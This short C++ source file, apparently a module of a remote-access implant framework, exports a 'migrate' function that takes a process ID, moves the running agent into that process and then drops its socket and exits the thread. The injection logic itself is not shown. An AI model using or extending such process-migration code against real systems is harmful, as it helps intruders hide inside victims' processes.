// This file was created by the dropin manager
// You still need to add the meat to your function

#include "../common/crt.h"
#include "../core/external.h"

extern "C" __declspec(dllexport) void migrate(const char *arg)
{
    uint32_t pid = atoi(arg);

    Next(pid);
    if(Migrate()){
        sc_printf("unable to migrate into process %d\n", pid);
        return;
    }
    SockDisconnect();
    ExitThread(0);
}


